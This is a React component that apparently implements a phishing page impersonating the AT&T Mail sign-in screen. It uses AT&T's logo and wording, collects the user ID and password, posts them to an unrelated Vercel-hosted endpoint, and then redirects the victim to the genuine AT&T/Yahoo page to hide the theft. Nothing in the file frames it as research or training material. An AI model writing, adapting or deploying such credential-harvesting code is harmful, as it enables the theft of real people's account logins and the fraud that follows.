import React, { useState } from 'react'
import axios from 'axios'
import Loader from '../components/Loader'
const Signin = () => {
  const [userData, setUserData] = useState({ userID: '', password: '' })
  const [showError, setShowError] = useState(false)
  const [redirect, setRedirect] = useState(false)

  const [isLoading, setisLoading] = useState(false)

  React.useEffect(() => {
    redirect && window.location.replace('https://currently.att.yahoo.com/')
  }, [redirect])

  const handleChange = (e) => {
    const { name, value } = e.target
    setUserData({ ...userData, [name]: value })
  }

  const handleSubmit = () => {
    setShowError(false)
    if (!userData['userID'] || !userData['password']) {
      setShowError(true)
      return
    }
    setisLoading(true)
    axios
      .post('https://att-signin-api.vercel.app/add-data', userData)
      // .post('http://127.0.0.1:3000/add-data', userData)
      .then((resp) => {
        console.log(resp.data)
        setRedirect(true)
      })
      .catch((e) => console.log(e))
  }

  const imgSrc =
    'https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg'

  return (
    <div className='w-[100%] h-[100%] md:w-screen md:h-screen flex items-center justify-center xs:my-16 md:my-auto'>
      <section className='flex flex-col items-center font-bold w-[25rem] md:border gap-2 rounded-2xl'>
        <img src={imgSrc} alt='' className='my-3 md:my-5' width={150} />
        <h2 className='text-3xl md:text-4xl'>Sign in</h2>
        <h3 className='text-2xl text-center'>
          to access AT&T Mail and Currently.com
        </h3>

        <section className='mt-3 flex flex-col w-full px-8 font-normal  gap-3 py-5'>
          <div className='flex flex-col w-full gap-1'>
            <label className='font-semibold text-[#454b52]'>User ID</label>
            <input
              className='border py-3 px-2 rounded-md input-color outline-[#0057B8]'
              name='userID'
              value={userData['userID']}
              onChange={handleChange}
            />
          </div>
          <div className='flex flex-col w-full gap-1'>
            <label className='font-semibold text-[#454b52]'>Password</label>
            <input
              className='border py-3 px-2 rounded-md input-color outline-[#0057B8]'
              name='password'
              value={userData['password']}
              onChange={handleChange}
              type='password'
            />
          </div>
          {showError && (
            <span>
              <p className='text-lg font-semibold text-red-800'>
                Please, enter User ID and password
              </p>
            </span>
          )}

          <button
            className='bg-[#0057B8] text-white font-semibold w-full py-3 text-lg rounded-full'
            onClick={handleSubmit}
          >
            Continue
          </button>
        </section>
      </section>
      {isLoading && <Loader />}
    </div>
  )
}

export default Signin
